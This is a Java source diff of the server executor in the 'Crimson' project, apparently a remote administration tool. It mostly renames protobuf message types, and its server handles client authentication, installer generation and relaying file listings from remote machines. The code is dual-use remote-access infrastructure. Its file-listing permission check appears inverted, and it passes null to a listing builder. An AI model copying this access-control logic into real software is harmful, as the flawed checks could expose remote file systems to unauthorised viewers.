@@ -27,20 +27,19 @@ import com.google.protobuf.ByteString;
 import com.subterranean_security.crimson.core.Common.Instance;
 import com.subterranean_security.crimson.core.net.BasicExecutor;
 import com.subterranean_security.crimson.core.net.ConnectionState;
-import com.subterranean_security.crimson.core.proto.net.Auth.Auth_1W;
-import com.subterranean_security.crimson.core.proto.net.Auth.GroupChallengeResult_1W;
-import com.subterranean_security.crimson.core.proto.net.Auth.GroupChallenge_RQ;
-import com.subterranean_security.crimson.core.proto.net.Auth.GroupChallenge_RS;
-import com.subterranean_security.crimson.core.proto.net.Delta.ProfileDelta_EV;
-import com.subterranean_security.crimson.core.proto.net.Delta.ServerInfoDelta_EV;
-import com.subterranean_security.crimson.core.proto.net.FM.FileListing_RS;
-import com.subterranean_security.crimson.core.proto.net.Gen.GenReport;
-import com.subterranean_security.crimson.core.proto.net.Gen.Generate_RS;
-import com.subterranean_security.crimson.core.proto.net.Gen.Group;
-import com.subterranean_security.crimson.core.proto.net.Login.LoginChallenge_RQ;
-import com.subterranean_security.crimson.core.proto.net.Login.Login_RS;
-import com.subterranean_security.crimson.core.proto.net.MSG.Message;
-import com.subterranean_security.crimson.core.proto.net.State.StateChange_RQ;
+import com.subterranean_security.crimson.core.proto.ClientAuth.Group;
+import com.subterranean_security.crimson.core.proto.ClientAuth.MI_AuthRequest;
+import com.subterranean_security.crimson.core.proto.ClientAuth.MI_GroupChallengeResult;
+import com.subterranean_security.crimson.core.proto.ClientAuth.RQ_GroupChallenge;
+import com.subterranean_security.crimson.core.proto.ClientAuth.RS_GroupChallenge;
+import com.subterranean_security.crimson.core.proto.Delta.ProfileDelta_EV;
+import com.subterranean_security.crimson.core.proto.Delta.ServerInfoDelta_EV;
+import com.subterranean_security.crimson.core.proto.FileManager.RS_FileListing;
+import com.subterranean_security.crimson.core.proto.Generator.GenReport;
+import com.subterranean_security.crimson.core.proto.Generator.RS_Generate;
+import com.subterranean_security.crimson.core.proto.Login.RQ_LoginChallenge;
+import com.subterranean_security.crimson.core.proto.Login.RS_Login;
+import com.subterranean_security.crimson.core.proto.MSG.Message;
 import com.subterranean_security.crimson.core.util.CUtil;
 import com.subterranean_security.crimson.core.util.Crypto;
 import com.subterranean_security.crimson.core.util.IDGen;
@@ -87,26 +86,24 @@ public class ServerExecutor extends BasicExecutor {
 					} catch (InterruptedException e) {
 						return;
 					}
-					if (m.hasLoginRq()) {
+					if (m.hasRqLogin()) {
 						new Thread(new Runnable() {
 							public void run() {
 								login_rq(m);
 							}
 						}).start();
 
-					} else if (m.hasGenerateRq()) {
+					} else if (m.hasRqGenerate()) {
 						generate_rq(m);
-					} else if (m.hasStateChangeRq()) {
-						stateChange_rq(m);
-					} else if (m.hasChallengeRq()) {
+					} else if (m.hasRqGroupChallenge()) {
 						challenge_rq(m);
-					} else if (m.hasAuth1W()) {
+					} else if (m.hasMiAuthRequest()) {
 						auth_1w(m);
-					} else if (m.hasChallengeresult1W()) {
+					} else if (m.hasMiChallengeresult()) {
 						challengeResult_1w(m);
-					} else if (m.hasFileListingRq()) {
+					} else if (m.hasRqFileListing()) {
 						file_listing_rq(m);
-					} else if (m.hasFileListingRs()) {
+					} else if (m.hasRsFileListing()) {
 						file_listing_rs(m);
 					} else {
 						receptor.cq.put(m.getId(), m);
@@ -144,11 +141,10 @@ public class ServerExecutor extends BasicExecutor {
 		if (receptor.getState() != ConnectionState.AUTH_STAGE2) {
 			return;
 		}
-		if (m.getChallengeresult1W().getResult()) {
+		if (m.getMiChallengeresult().getResult()) {
 			receptor.setState(ConnectionState.AUTHENTICATED);
 			receptor.setInstance(Instance.CLIENT);
 			ServerStore.Connections.add(receptor);
-			profileDelta(m.getChallengeresult1W().getInitialInfo());
 		} else {
 			log.debug("Authentication failed");
 			receptor.setState(ConnectionState.CONNECTED);
@@ -163,7 +159,7 @@ public class ServerExecutor extends BasicExecutor {
 		} else {
 			receptor.setState(ConnectionState.AUTH_STAGE1);
 		}
-		Auth_1W auth = m.getAuth1W();
+		MI_AuthRequest auth = m.getMiAuthRequest();
 		if (auth.getCvid() != 0) {
 			receptor.setCvid(auth.getCvid());
 		} else {
@@ -182,13 +178,13 @@ public class ServerExecutor extends BasicExecutor {
 			final int id = IDGen.get();
 
 			final String magic = CUtil.Misc.randString(64);
-			GroupChallenge_RQ rq = GroupChallenge_RQ.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
-			receptor.handle.write(Message.newBuilder().setId(id).setChallengeRq(rq).build());
+			RQ_GroupChallenge rq = RQ_GroupChallenge.newBuilder().setGroupName(group.getName()).setMagic(magic).build();
+			receptor.handle.write(Message.newBuilder().setId(id).setRqGroupChallenge(rq).build());
 
 			new Thread(new Runnable() {
 				public void run() {
 					try {
-						GroupChallenge_RS rs = receptor.cq.take(id, 7, TimeUnit.SECONDS).getChallengeRs();
+						RS_GroupChallenge rs = receptor.cq.take(id, 7, TimeUnit.SECONDS).getRsGroupChallenge();
 						boolean flag = rs.getResult().equals(Crypto.sign(magic, group.getKey()));
 						if (flag) {
 							receptor.setState(ConnectionState.AUTH_STAGE2);
@@ -197,7 +193,7 @@ public class ServerExecutor extends BasicExecutor {
 							receptor.setState(ConnectionState.CONNECTED);
 						}
 						receptor.handle.write(Message.newBuilder().setId(id)
-								.setChallengeresult1W(GroupChallengeResult_1W.newBuilder().setResult(flag).build())
+								.setMiChallengeresult(MI_GroupChallengeResult.newBuilder().setResult(flag).build())
 								.build());
 					} catch (Exception e) {
 						// TODO Auto-generated catch block
@@ -237,12 +233,12 @@ public class ServerExecutor extends BasicExecutor {
 		if (receptor.getState() != ConnectionState.AUTH_STAGE2) {
 			return;
 		}
-		GroupChallenge_RQ rq = m.getChallengeRq();
+		RQ_GroupChallenge rq = m.getRqGroupChallenge();
 		Group group = ServerStore.Authentication.getGroup(rq.getGroupName());
 
-		GroupChallenge_RS rs = GroupChallenge_RS.newBuilder().setResult(Crypto.sign(rq.getMagic(), group.getKey()))
+		RS_GroupChallenge rs = RS_GroupChallenge.newBuilder().setResult(Crypto.sign(rq.getMagic(), group.getKey()))
 				.build();
-		receptor.handle.write(Message.newBuilder().setId(m.getId()).setChallengeRs(rs).build());
+		receptor.handle.write(Message.newBuilder().setId(m.getId()).setRsGroupChallenge(rs).build());
 		try {
 			Thread.sleep(100);
 		} catch (InterruptedException e) {
@@ -254,11 +250,11 @@ public class ServerExecutor extends BasicExecutor {
 
 	private void login_rq(Message m) {
 		receptor.setInstance(Instance.VIEWER);
-		String user = m.getLoginRq().getUsername();
+		String user = m.getRqLogin().getUsername();
 		ServerInfoDelta_EV.Builder sid = ServerInfoDelta_EV.newBuilder();
 
-		if (m.getLoginRq().getSvid() != 0) {
-			receptor.setCvid(m.getLoginRq().getSvid());
+		if (m.getRqLogin().getSvid() != 0) {
+			receptor.setCvid(m.getRqLogin().getSvid());
 		} else {
 			ServerCommands.setCvid(receptor, IDGen.getCvid());
 		}
@@ -269,20 +265,20 @@ public class ServerExecutor extends BasicExecutor {
 				pass = false;
 				return;
 			}
-			LoginChallenge_RQ.Builder lcrq = LoginChallenge_RQ.newBuilder()
+			RQ_LoginChallenge.Builder lcrq = RQ_LoginChallenge.newBuilder()
 					.setSalt(ServerStore.Databases.system.getSalt(user));
-			receptor.handle.write(Message.newBuilder().setId(m.getId()).setLoginChallengeRq(lcrq).build());
+			receptor.handle.write(Message.newBuilder().setId(m.getId()).setRqLoginChallenge(lcrq).build());
 			Message lcrs = null;
 			try {
 				lcrs = receptor.cq.take(m.getId(), 5, TimeUnit.SECONDS);
-				log.debug("Received login challenge response: {}", lcrs.getLoginChallengeRs().getResult());
+				log.debug("Received login challenge response: {}", lcrs.getRsLoginChallenge().getResult());
 			} catch (InterruptedException e) {
 				log.error("No response to login challenge");
 				pass = false;
 				return;
 			}
-			pass = ServerStore.Databases.system.validLogin(m.getLoginRq().getUsername(),
-					lcrs.getLoginChallengeRs().getResult());
+			pass = ServerStore.Databases.system.validLogin(m.getRqLogin().getUsername(),
+					lcrs.getRsLoginChallenge().getResult());
 			if (pass) {
 				log.debug("Accepting Login");
 				receptor.setState(ConnectionState.AUTHENTICATED);
@@ -315,23 +311,9 @@ public class ServerExecutor extends BasicExecutor {
 
 		} finally {
 			receptor.handle.write(Message.newBuilder().setId(m.getId())
-					.setLoginRs(Login_RS.newBuilder().setResponse(pass).setInitialInfo(sid)).build());
+					.setRsLogin(RS_Login.newBuilder().setResponse(pass).setInitialInfo(sid)).build());
 			log.info("Login outcome: " + pass);
 			receptor.close();
-		}
-	}
-
-	private void stateChange_rq(Message m) {
-		StateChange_RQ rq = m.getStateChangeRq();
-		switch (rq.getType()) {
-		case POWER:
-			break;
-		case SERVER:
-			Server.setState(rq.getChange());
-			break;
-		default:
-			break;
-
 		}
 	}
 
@@ -340,7 +322,7 @@ public class ServerExecutor extends BasicExecutor {
 		byte[] res = null;
 		Generator g = null;
 		try {
-			g = new Generator(m.getGenerateRq().getInternalConfig());
+			g = new Generator(m.getRqGenerate().getInternalConfig());
 			res = g.getResult();
 		} catch (Exception e) {
 			log.info("Could not generate installer");
@@ -348,30 +330,30 @@ public class ServerExecutor extends BasicExecutor {
 
 			GenReport.Builder gr = GenReport.newBuilder();
 			gr.setResult(false).setGenTime(0).setComment("An unexpected error has occured");
-			Generate_RS.Builder rs = Generate_RS.newBuilder().setReport(gr.build());
-			receptor.handle.write(Message.newBuilder().setId(m.getId()).setGenerateRs(rs).build());
+			RS_Generate.Builder rs = RS_Generate.newBuilder().setReport(gr.build());
+			receptor.handle.write(Message.newBuilder().setId(m.getId()).setRsGenerate(rs).build());
 			return;
 		}
-		Generate_RS.Builder rs = Generate_RS.newBuilder().setInstaller(ByteString.copyFrom(res))
+		RS_Generate.Builder rs = RS_Generate.newBuilder().setInstaller(ByteString.copyFrom(res))
 				.setReport(g.getReport());
-		receptor.handle.write(Message.newBuilder().setId(m.getId()).setGenerateRs(rs).build());
+		receptor.handle.write(Message.newBuilder().setId(m.getId()).setRsGenerate(rs).build());
 	}
 
 	private void file_listing_rq(Message m) {
 		ViewerProfile vp = null;
 		try {
-			vp = ServerStore.Profiles.getViewer(m.getFileListingRq().getClientid());
+			vp = ServerStore.Profiles.getViewer(m.getRqFileListing().getCid());
 		} catch (Exception e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
 			return;
 		}
-		if (m.getFileListingRq().hasClientid()) {
-			if (vp.getPermissions().verify(m.getFileListingRq().getClientid(), "fs.read")) {
+		if (m.getRqFileListing().hasCid()) {
+			if (vp.getPermissions().verify(m.getRqFileListing().getCid(), "fs.read")) {
 				System.out.println("Permissions error");
 				return;
 			}
-			Receptor r = ServerStore.Connections.getConnection(m.getFileListingRq().getClientid());
+			Receptor r = ServerStore.Connections.getConnection(m.getRqFileListing().getCid());
 			r.handle.write(m);
 
 		} else {
@@ -379,15 +361,16 @@ public class ServerExecutor extends BasicExecutor {
 				System.out.println("Permissions error");
 				return;
 			}
-			receptor.handle.write(Message.newBuilder().setFileListingRs(
-					FileListing_RS.newBuilder().addAllListing(null).setViewerid(m.getFileListingRq().getViewerid()))
+			receptor.handle.write(Message.newBuilder()
+					.setRsFileListing(
+							RS_FileListing.newBuilder().addAllListing(null).setVid(m.getRqFileListing().getVid()))
 					.build());
 		}
 
 	}
 
 	private void file_listing_rs(Message m) {
-		Receptor r = ServerStore.Connections.getConnection(m.getFileListingRq().getViewerid());
+		Receptor r = ServerStore.Connections.getConnection(m.getRqFileListing().getVid());
 		r.handle.write(m);
 	}
 
